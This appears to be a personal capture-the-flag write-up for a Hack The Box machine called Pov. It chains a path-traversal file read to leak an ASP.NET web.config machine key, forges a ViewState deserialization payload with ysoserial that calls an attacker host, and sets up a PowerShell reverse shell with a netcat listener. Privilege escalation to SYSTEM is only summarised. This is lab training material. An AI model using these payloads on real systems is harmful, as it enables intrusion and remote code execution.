## **1. Initial Enumeration - Finding the Subdomain (`dev.pov.htb`)**

- The machine starts with a **business webpage**.
- Enumerating the site (e.g., using `gobuster` or `ffuf`) reveals a **subdomain: `dev.pov.htb`**.
- This suggests that there is a development/testing environment, which often has security misconfigurations.

---

## **2. Remote File Read Vulnerability**

- The **`dev.pov.htb`** subdomain has a **download functionality**.
- This feature is **vulnerable to Local File Inclusion (LFI)**, allowing an attacker to read arbitrary files on the server.
- By exploiting this, the attacker **retrieves `web.config`**, a critical file in **ASP.NET applications** that often contains sensitive information like:
    - **Database credentials**
    - **Encryption keys**
    - **Application settings**

---

## **3. Exploiting ViewState Insecure Deserialization**

- The web application uses **ASP.NET ViewState**, which stores page state data.
    
- If ViewState is **not properly secured**, an attacker can manipulate it to perform **arbitrary code execution**.
    
- With the **secrets leaked from `web.config`**, the attacker can:
    
    - **Generate a malicious ViewState payload**.
    - **Bypass MAC validation** (if machine key is leaked).
    - **Trigger remote code execution (RCE)**.
- This results in **command execution as `sfitz`**, a low-privileged user on the system.
    

---

## **4. Moving Laterally - Finding Credentials for `alaading`**

- Once the attacker has **file system access as `sfitz`**, they search for **sensitive files**.
- A key discovery is a **file that contains credentials** for another user: `alaading`.
- These credentials allow the attacker to switch to `alaading`, **escalating privileges further**.

---

## **5. Privilege Escalation - Abusing `SeDebugPrivilege`**

- The user `alaading` has **SeDebugPrivilege**, which allows:
    
    - Attaching a debugger to **high-privilege processes**.
    - Modifying processes running as `SYSTEM`.
- By exploiting `SeDebugPrivilege`, the attacker can **inject code into a privileged process**, ultimately **executing commands as `NT AUTHORITY\SYSTEM`**, the highest privilege level in Windows.
    

---

## **Final Outcome**

- The attacker **gains full control** over the machine by chaining:
    1. **Web vulnerability exploitation** (LFI to leak `web.config`).
    2. **ViewState deserialization attack** (RCE as `sfitz`).
    3. **Finding and using credentials** for `alaading`.
    4. **Abusing `SeDebugPrivilege`** to execute commands as **SYSTEM**.


---
## enumeration

ip= 10.10.11.251
```bash
┌──(pwn㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- -T4 10.10.11.251
[sudo] password for pwn: 
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: pov.htb
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```
-visit <> http://10.10.11.251
-edit /etc/hosts
-found `pov.htb`

sfitz@pov.htb
http://dev.pov.htb/portfolio/

Stephen Fitz

Web frameworks:
Microsoft ASP.NET 
.aspx
default.aspx
web.config <> windows iis
```
`default.aspx` → Refers to the **default page** of an ASP.NET web application.
```
-I think his work is good however I noticed that he did not perform good secure coding practices especially when programming in `ASP.Net`
```
intercept via burpsuit when preesing on the cv download

_EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=qd9RtNzmAZScCoXOybI42D4rMsjizAW3IIgogQDLcMcM5yvFrvDtWVn5t%2BHgA99JrFLe76JDzkCU3jlnIunnKHHzRhI%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=48BkbX0d%2BuKA0HNVvPk8wI3t0IMCjCXR1v3h3LuaKphMezdWT7ijBq0R80Ob27xvn%2BwcjzFp8SiSwUSsWkBcasRO24nGNPn9wDuIEHAj4kScet3uy9%2FRiffz266oVnR4dZlkNw%3D%3D&file=index.aspx.cs

file=..././web.config

```
---
```
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/octet-stream
Server: Microsoft-IIS/10.0
Content-Disposition: attachment; filename=../web.config
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Sun, 16 Feb 2025 11:34:18 GMT
Content-Length: 866
<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>

```

---
```bash
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c “powershell.exe Invoke-WebRequest -Uri http://10.10.14.25/$env:UserName" — path=”/portfolio/contact.aspx” — apppath=”/” — decryptionalg=”AES” — decryptionkey=”74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" — validationalg=”SHA1" — validationkey=”5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```
![[Pasted image 20250216155029.png]]

```bash
┌──(pwn㉿kali)-[~/POV]
└─$ cat Invoke-PowerShellTcpOneLine.ps1                        nishang webshell                                                                    
┌──(pwn㉿kali)-[~/POV]
└─$ cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t utf-16le |base64 -w 0

```

```
open python3 http server
set up nc -nlvp 9999
copy the base 64

.\ysoserial.exe .....
```
![[Pasted image 20250216162808.png]]
`-i have issue with copy pasting from windows <> host or kali`

---

-i will use wine 
```bash
sudo apt install mono-complete wine winetricks -y
```


---

```
<machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
```